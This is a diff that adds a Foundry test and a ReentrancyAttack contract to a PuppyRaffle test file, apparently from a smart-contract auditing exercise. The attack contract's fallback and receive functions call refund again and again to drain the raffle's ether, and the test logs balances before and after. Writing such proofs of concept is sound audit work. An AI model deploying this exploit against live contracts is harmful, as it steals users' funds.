@@ -244,4 +244,67 @@ contract PuppyRaffleTest is Test {
 
         assert(gasUsedSecond > gasUsedFirst);
     }
+
+    // Function to test Reentrancy
+    function testReentrancy() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReentrancyAttack reentrancyAttack = new ReentrancyAttack(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 1 ether);
+        
+        uint256 balanceAttackContractBefore = address(reentrancyAttack).balance;
+        uint256 balanceContractBefore = address(puppyRaffle).balance;
+        
+        vm.prank(attacker);
+        reentrancyAttack.attack{value: 1 ether}();
+        
+        uint256 balanceContractAfter = address(puppyRaffle).balance;
+        uint256 balanceAttackContractAfter = address(reentrancyAttack).balance;
+        
+        console.log("balanceContractBefore", balanceContractBefore);
+        console.log("balanceAttackContractBefore", balanceAttackContractBefore);
+        console.log("================================================");
+        console.log("balanceContractAfter", balanceContractAfter);
+        console.log("balanceAttackContractAfter", balanceAttackContractAfter);
+
+    }
+}
+
+contract ReentrancyAttack {        
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 indexOfAttacker;
+
+    constructor(PuppyRaffle _puppyRaffle){
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() public payable{
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        indexOfAttacker = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(indexOfAttacker);
+    }
+
+    function _stealMoney() internal {
+        if(address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(indexOfAttacker);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+    
+    receive() external payable {
+        _stealMoney();
+    }
 }
